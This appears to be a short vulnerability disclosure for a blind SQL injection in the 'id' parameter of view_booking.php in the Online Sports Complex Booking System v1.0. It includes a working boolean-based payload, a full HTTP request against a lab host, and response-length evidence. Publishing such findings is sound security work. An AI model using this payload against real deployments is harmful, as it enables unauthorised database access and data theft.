# Online Sports Complex Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15236/online-sports-complex-booking-system-phpmysql-free-source-code.html

Vulnerability File: /scbs/admin/bookings/view_booking.php?id=

Vulnerability location: /scbs/admin/bookings/view_booking.php?id=, id

Current database name: scbs_db,length is 7

[+] Payload: /scbs/admin/bookings/view_booking.php?id=4%27%20and%20length(database())%20=7%20--+

```sql
GET /scbs/admin/bookings/view_booking.php?id=4%27%20and%20length(database())%20=7%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=gp584rjk4ugbjakmto03cu7pco
Connection: close

// Leak place ---> id
```

When length (database ()) = 6, Content-Length: 2952
![image](https://user-images.githubusercontent.com/54017627/165216424-ff2e3568-a389-4968-b839-22eba68db776.png)

![image](https://user-images.githubusercontent.com/54017627/165216351-2218a28c-2ac2-4813-be3f-c34ffb6fef93.png)

When length (database ()) = 7, Content-Length: 2460
![image](https://user-images.githubusercontent.com/54017627/165216396-6b93c800-392f-4b60-89bb-93a5cd7711d3.png)

![image](https://user-images.githubusercontent.com/54017627/165216318-0cb512da-b569-449f-9f3e-0c913ddac64b.png)

